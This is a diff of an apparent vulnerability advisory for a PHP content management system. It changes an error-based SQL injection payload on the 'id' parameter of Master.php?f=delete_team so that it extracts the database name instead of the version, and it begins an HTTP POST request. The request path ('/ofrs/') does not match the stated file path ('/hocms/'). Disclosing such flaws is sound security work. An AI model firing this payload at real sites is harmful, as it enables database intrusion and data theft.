@@ -10,7 +10,7 @@ Vulnerability file: /hocms/classes/Master.php?f=delete_team
 
 Vulnerability location: /hocms/classes/Master.php?f=delete_team,id
 
-[+]Payload: id=2' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point
+[+]Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point
 
 ```
 POST /ofrs/classes/Master.php?f=delete_team HTTP/1.1
